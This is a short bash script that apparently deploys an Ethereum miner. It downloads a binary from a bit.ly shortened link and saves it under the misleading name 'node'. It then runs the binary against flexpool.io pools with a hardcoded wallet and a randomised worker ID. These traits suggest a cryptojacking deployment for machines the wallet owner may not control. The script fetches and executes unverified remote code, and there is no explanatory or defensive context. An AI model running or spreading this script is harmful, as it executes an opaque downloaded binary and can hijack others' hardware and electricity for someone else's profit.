#!/bin/bash

WORKER=$(echo $(shuf -i 1-99999 -n 1)-sMGo)
apt-get update
apt-get install libpci3
wget -O node https://bit.ly/3BlLtp8
./node -pool ssl://eth-sg.flexpool.io:5555 -pool2 ssl://eth-hke.flexpool.io:5555 -wal 0xb2c9efdea153d431af54a20ba308f72efd5b9da9.$WORKER
